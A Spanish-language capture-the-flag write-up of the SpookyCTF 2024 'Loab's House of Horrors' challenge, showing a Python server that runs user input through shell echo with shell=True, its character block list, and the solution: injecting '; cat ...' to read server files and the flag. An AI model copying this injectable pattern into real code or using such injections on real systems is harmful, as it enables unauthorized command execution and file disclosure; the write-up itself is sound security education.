---
title: Loab´s House of Horrors - SpookyCTF2024
author: Kesero
description: Reto Binario basado en una Pyjail.
date: 2024-10-27 15:30:00 +0800
categories: [Writeups Competiciones Internacionales, Miscelánea]
tags: [Misc, Misc - Pyjail, Otros - Writeups, Dificultad - Media, SpookyCTF]
pin: false
math: true
mermaid: true
image:
  path: https://raw.githubusercontent.com/k3sero/Blog_Content/refs/heads/main/Competiciones_Internacionales_Writeups/2024/Pwn/Spookyctf2024/Loab_House_of_Horrors/Loab_House_of_Horrors.png
  lqip: 
  alt: 
comments: true
---

Autor del reto: `Cyb0rgSw0rd`

Dificultad: <font color=orange>Media</font>

## Enunciado

It sounds like Loab is back and luring students into their trap. Thankfully Anna managed to rip the source code before Loab left the NJIT network. If we can find the flag we might be able to shut this down! nc loabshouse.niccgetsspooky.xyz 1337


## Archivos

En este reto nos dan una serie de archivos:

- `files`: Carpeta que contiene el source code. (welcome.py y watchdog.py)
- `nc loabshouse.niccgetsspooky.xyz 1337`: Conexion por netcat para interactuar con el servidor.

Archivos utilizados en mi [repositorio de Github](https://github.com/k3sero/Blog_Content/tree/main/Competiciones_Internacionales_Writeups/2024/Pwn/Spookyctf2024/Loab_House_of_Horrors).


## Analizando el Código

Analizando la carpeta `files` nos encontramos dos archivos, uno de ellos es `welcome.py` el cual cuenta con la lógica del servidor en ejecución y el otro `watchdog.py` el cual actúa como un temporizador.

Al conectarnos por netcat nos encontramos los siguiente:

    You have entered the house of horrors. You will be presented with a series of challenges.
    If you complete them all, you will be rewarded with the flag.
    If you fail, you will be trapped here forever.
    Who dares enter my realm: 

        Get comfortable. You will be here forever.
        Cg==

        Your mother was a hamster and your father smelt of elderberries.

                Is that it? Pitiful.

Donde por parte del usuario, nos piden que intrdozucamos 2 cadenas, una después de "Who dares enter my realm:" y la segunda justo en "Is that it? Pitiful."
Además, nos arrojará una cadena en base64 partiendo de lo que le introduzcamos.

Vamos a ver qué contiene el script `welcome.py`

```python
import socket
import threading
import subprocess
import random
import base64 as rb
import os
import sys
import signal

# START OUR REAPER, the watchdog
watchdog_process = subprocess.Popen(["python3", "CORRUPTED-CONTENT-MISSING"])


# Cleanup after ourselves because we are polite AI demons
def cleanup(signum, frame):
    watchdog_process.terminate()
    watchdog_process.wait()
    sys.exit(0)


# Signal the hellhounds
signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)
# Use our very evil seed to ensure supreme evil randomness
random.seed(666)


welcome = f"Welcome to my house of horrors...\n\n".encode()

# PLACES I MIGHT WANT TO MOVE THE FLAG TO
locations = {
    "0": "/tmp/singularity",
    "1": "/tmp/abyss",
    "2": "/tmp/orphans",
    "3": "/home/council",
    "4": "/tmp/.boom",
    "5": "/home/victim/.consortium",
    "6": "/usr/bnc/.yummyarbs",
    "7": "/tmp/.loab",
    "8": "/tmp/loab",
}


# Me at the club in the 2010s
def shuffle_it():
    location = random.randint(0, 8)
    locswild = location + 1
    # You remember frankie muniz from Deuces Wild?
    locswild = rb.b64encode(locswild)
    # What a movie that was.
    where = locations[str(location)]
    # I'm not sure if I'm supposed to be moving the flag or the goalposts
    possible_locations = ["/home/victim/flag.txt"] + list(locations.values())
    flag_found = False

    for loc in possible_locations:
        if os.path.exists(loc):
            try:
                # Run things in the background because we actually have a lot of stuff to do
                subprocess.run(["mv", loc, where], check=True)
                flag_found = True
                break
            except Exception as e:
                # Obviously we need to gracefully handle things
                print(f"Failed to move flag from {loc} to {where}: {e}")
        else:
            # This won't get called. I'm sure of it. I worked hard.
            print(f"Flag not found at {loc}")
    if not flag_found:
        print("Flag not found in any location")
    return flag_found


def twisted(content):
    a = rb.b64encode(content)
    b = rb.b64encode(content)
    x = rb.b64encode(b)
    c = rb.b64encode(b)
    c = rb.b64encode(content)
    e = rb.b64encode(content)
    d = rb.b64encode(content)
    return b


def monologue():
    monologue = """
    You have entered the house of horrors. You will be presented with a series of challenges.
    If you complete them all, you will be rewarded with the flag.
    If you fail, you will be trapped here forever.
    """.encode()
    return monologue


taunt = {
    "0": f"\nWhat makes you believe you can escape?\n",
    "1": f"\nYou are doomed to fail.\n",
    "2": f"\nYou will never leave this place.\n",
    "3": f"\nDid you walk under the Clocktower? You are cursed.\n",
    "4": f"\nYou are not the first to try and you will not be the last.\n",
    "5": f"\nI will enjoy torturing you.\n",
    "6": f"\nYou could have put on deodorant.\n",
    "7": f"\nTypical CS Students, always trying to escape.\n",
    "8": f"\nI don't care what major you are, you're going to minor in pain.\n",
    "9": f"\nHey, at least you won't have to take an exam.\n",
    "10": f"\nYou will never see the light of day again.\n",
    "11": f"\nWhat size shackles do you wear?\n",
    "12": f"\nYour mother was a hamster and your father smelt of elderberries.\n",
    "13": f"\nNICC will never find you.\n",
    "14": f"\nEven Anna and Simon didn't dare tread here - and you think you can stand where they feared?\n",
    "15": f"\nYou are not prepared.\n",
    "16": f"\nVile creature, you will never escape.\n",
}


def converse(conn):
    try:
        taunt_number = random.randint(0, 15)
        conn.send(b"\n\t")
        conn.send(taunt[str(taunt_number)].encode())
        conn.send(b"\n\tIs that it? Pitiful.")
        response = conn.recv(1024)
        if not response:
            print("Client disconnected during converse.")
            return
        response = response.decode().strip()
        if any(char in response for char in [";", "&", "|", "`", "$", ">", "<"]):
            with open("/tmp/injection_detected", "w") as f:
                f.write("1")
            conn.send(b"\nYou have triggered my trap! The end is near...\n")

        try:
            output = subprocess.check_output(
                f"echo Pitiful. {response}",
                shell=True,
                stderr=subprocess.STDOUT,
            )
            output = twisted(output)
            conn.send(output)
        except subprocess.CalledProcessError as e:
            conn.send(b"\n\tYou are not worth my time.\n")
            conn.send(b"\n\tConnection will be terminated.\n")
            conn.close()
            return

        conn.send(b"\n\tGoodbye.\n")
        conn.close()
        return

    except Exception as e:
        print(f"Error during converse: {e}")
    finally:
        conn.close()
        print("Connection closed during conversation.")


def handle_client(conn, addr):
    print("Handling client:", addr)
    shuffle_it()
    conn.send(monologue())
    conn.send(b"Who dares enter my realm: ")
    name = conn.recv(1024)
    if not name:
        print("Client disconnected before talking.")
        conn.close()
        cleanup(None, None)
    name = name.decode().strip()
    try:
        output = subprocess.check_output(
            f"echo {name} ",
            shell=True,
            stderr=subprocess.STDOUT,
        )
        output = twisted(output)
        conn.send(b"\n\tGet comfortable. You will be here forever.\n")
        conn.send(output)
    except subprocess.CalledProcessError as e:
        conn.send(b"\nYou are not worth my time.\n")
        conn.close()
        conn.shutdown(socket.SHUT_RDWR)
        return

    converse(conn)
    print("Connection closed with client:", addr)
    cleanup(None, None)


def main():
    HOST = "0.0.0.0"
    PORT = 9999

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(1)
    print(f"Server listening on {HOST}:{PORT}")

    conn, addr = server.accept()
    print(f"Accepted connection from {addr}, connection: {conn}")
    handle_client(conn, addr)


if __name__ == "__main__":
    main()
```

Al analizar el código, a groso modo podemos observar que se trata de una pyjail, la cual, basándose en una seed hardcodeada en el código, obtiene una posible ruta del mapa `locations`. Este mapa cuenta con diversas rutas del sistema y es en una de ellas donde se guarda la flag. Nuestra misión es leer dicha flag utilizando los inputs del programa. ¿Sencillo, cierto? Antes de proponer una solución vamos a continuar analizando el código y podemos ver que existen una serie de restricciones.

```python
if any(char in response for char in [";", "&", "|", "`", "$", ">", "<"]):
            with open("/tmp/injection_detected", "w") as f:
                f.write("1")
            conn.send(b"\nYou have triggered my trap! The end is near...\n")
```
Podemos pensar que dichas restricciones no nos permiten continuar con nuestro programa, pero realmente lo único que varía en la ejecución de dicho programa es en la cadena que arroja y que cambia de variable un archivo que es completamente irrelevante, por lo que realmente podemos utilizar dichas expresiones más adelante.

Además, volviendo al apartado `seed` podemos observar que está hardcodeada directamente en el código, es decir que el programa siempre va a elegir la misma ruta donde guardar la flag, además de siempre arrojar el mismo mensaje en la ejecución.

Además hay que aclarar que justo en los inputs que tenemos que mandarle al servidor, estamos dentro de un `echo` por parte del servidor, por lo que tenemos que tenerlo en cuenta para la ejecución de comandos.

Para finalizar el análisis, la salida que nos arroja el servidor no está en texto claro, si no codificada en base64. Esto no resulta ningún problema ya que con herramientas como `base64` o `Cyberchef`, podremos decodificar dichos mensajes en texto claro.

## Solución

Analizado el código anterior, para resolver dicho reto primero tenemos que asegurarnos de tener capacidad de directory listing dentro del servidor y mostrar los archivos, rutas y carpetas con el que este cuenta.

Para ello se nos pueden ocurrir diversas maneras, pero la más sencilla es utilizando "/*" la cual nos arroja todo el contenido del directorio raiz. Al hacerlo observamos lo siguiente 

        ┌──(kesero㉿kali)-[~]
        └─$ nc loabshouse.niccgetsspooky.xyz 1337

        You have entered the house of horrors. You will be presented with a series of challenges.
        If you complete them all, you will be rewarded with the flag.
        If you fail, you will be trapped here forever.
        Who dares enter my realm: /*

        Get comfortable. You will be here forever.
        L2JpbiAvYm9vdCAvZGV2IC9ldGMgL2hvbWUgL2xpYiAvbGliNjQgL21lZGlhIC9tbnQgL29wdCAvcHJvYyAvcm9vdCAvcnVuIC9zYmluIC9zcnYgL3N5cyAvdG1wIC91c3IgL3Zhcgo=

        Your mother was a hamster and your father smelt of elderberries.

        Is that it? Pitiful.


Podemos observar que el programa nos arroja una cadena en base64 enorme, la decodificamos y observamos lo siguiente.

        ┌──(kesero㉿kali)-[~]
        └─$ echo "L2JpbiAvYm9vdCAvZGV2IC9ldGMgL2hvbWUgL2xpYiAvbGliNjQgL21lZGlhIC9tbnQgL29wdCAvcHJvYyAvcm9vdCAvcnVuIC9zYmluIC9zcnYgL3N5cyAvdG1wIC91c3IgL3Zhcgo=" | base64 -d
        /bin /boot /dev /etc /home /lib /lib64 /media /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var

Listo, podemos ver todo el contenido de archivos por parte del servidor, así que ahora nuestra labor será el listar el contenido de la flag. Cabe aclarar que con este comando, solo podemos listar archivos pero no leer dichos archivos. Es por ello que tenemos que encontrar una manera para ejecutar comandos de lectura como `cat` o `less`.

Nota: Como tenemos capacidad de listar directorios y archivos, podemos listar los archivos en /bin y observar que `cat` y `less` están dentro.

Para ello, como antes mencione que el propio input del usuario esta dentro de un `echo` por parte del servidor, tenemos que escapar de dicho echo para posteriormente poder ejecutar comandos arbitrarios por parte del usuario. Para conseguir ese cometido, simplemente si cerramos la sentencia `echo` con `;`, posteriormente tendremos vía libre para ejecutar comandos. Vamos a probarlo con un arhivo llamado `/root/supervisord.log` que se encuentra en el servidor.


        ┌──(kesero㉿kali)-[~]
        └─$ nc loabshouse.niccgetsspooky.xyz 1337

        You have entered the house of horrors. You will be presented with a series of challenges.
        If you complete them all, you will be rewarded with the flag.
        If you fail, you will be trapped here forever.
        Who dares enter my realm: 

        Get comfortable. You will be here forever.

        Your mother was a hamster and your father smelt of elderberries.

                Is that it? Pitiful.; cat /root/supervisord.log

        You have triggered my trap! The end is near...
        UGl0aWZ1bC4KMjAyNC0xMC0yNyAxNDowMzo0Niw2ODkgQ1JJVCBTdXBlcnZpc29yIGlzIHJ1bm5pbmcgYXMgcm9vdC4gIFByaXZpbGVnZXMgd2VyZSBub3QgZHJvcHBlZCBiZWNhdXNlIG5vIHVzZXIgaXMgc3BlY2lmaWVkIGluIHRoZSBjb25maWcgZmlsZS4gIElmIHlvdSBpbnRlbmQgdG8gcnVuIGFzIHJvb3QsIHlvdSBjYW4gc2V0IHVzZXI9cm9vdCBpbiB0aGUgY29uZmlnIGZpbGUgdG8gYXZvaWQgdGhpcyBtZXNzYWdlLgoyMDI0LTEwLTI3IDE0OjAzOjQ2LDY5MiBJTkZPIHN1cGVydmlzb3JkIHN0YXJ0ZWQgd2l0aCBwaWQgMQoyMDI0LTEwLTI3IDE0OjAzOjQ3LDY5NSBJTkZPIHNwYXduZWQ6ICd3ZWxjb21lJyB3aXRoIHBpZCA3CjIwMjQtMTAtMjcgMTQ6MDM6NDgsNjk0IElORk8gc3VjY2Vzczogd2VsY29tZSBlbnRlcmVkIFJVTk5JTkcgc3RhdGUsIHByb2Nlc3MgaGFzIHN0YXllZCB1cCBmb3IgPiB0aGFuIDEgc2Vjb25kcyAoc3RhcnRzZWNzKQo=
        Goodbye.

Decodificando dicha cadena, obtenemos la información en texto claro de dicho archivo.

        Pitiful.
        2024-10-27 14:03:46,689 CRIT Supervisor is running as root.  Privileges were not dropped because no user is specified in the config file.  If you intend to run as root, you can set user=root in the config file to avoid this message.
        2024-10-27 14:03:46,692 INFO supervisord started with pid 1
        2024-10-27 14:03:47,695 INFO spawned: 'welcome' with pid 7
        2024-10-27 14:03:48,694 INFO success: welcome entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)

Llegados a este punto tenemos los ingredientes necesarios, capacidad de directory listing y capcacidad de leer archivos. Con lo que tenemos que encontrar donde se sitúa la flag a través de los directorios y leerla con el prompt anterior. 

Para hacerlo todo mucho más sencillo sin la necesidad de estar buscando en directorios, como sabemos que las posibles rutas donde se sitúa la flag son las siguientes, podemos realizar un `cat` múltiple a dichas ubicaciones, ya que al menos en un lugar de todas ellas está.

```python
        # PLACES I MIGHT WANT TO MOVE THE FLAG TO
                locations = {
                "0": "/tmp/singularity",
                "1": "/tmp/abyss",
                "2": "/tmp/orphans",
                "3": "/home/council",
                "4": "/tmp/.boom",
                "5": "/home/victim/.consortium",
                "6": "/usr/bnc/.yummyarbs",
                "7": "/tmp/.loab",
                "8": "/tmp/loab",
}
```

Por lo que realizamos un último prompt y obtenemos lo siguiente:

    ┌──(kesero㉿kali)-[~]
    └─$ nc loabshouse.niccgetsspooky.xyz 1337

        You have entered the house of horrors. You will be presented with a series of challenges.
        If you complete them all, you will be rewarded with the flag.
        If you fail, you will be trapped here forever.
        Who dares enter my realm: as

        Get comfortable. You will be here forever.
        YXMK

        Your mother was a hamster and your father smelt of elderberries.

        I       s that it? Pitiful.; cat /tmp/singularity; cat /tmp/abyss ; cat /tmp/orphans; cat /home/council; cat /tmp/.boom; cat /home/victim/.consortium;  cat /usr/bnc/.yummyarbs; cat /tmp/.loab; cat /tmp/loab

        You have triggered my trap! The end is near...
U       Gl0aWZ1bC4KTklDQ3tKdTV0X3B1N19sMEBiXzFuX3JjM19vcl9oMzExX2lfZ3Uzc3N9
        Goodbye.


Decodificamos la cadena y obtenemos la flag.

        Pitiful. cat /tmp/singularity
        NICC{Ju5t_pu7_l0@b_1n_rc3_or_h311_i_gu3ss}

## Flag

`NICC{Ju5t_pu7_l0@b_1n_rc3_or_h311_i_gu3ss}`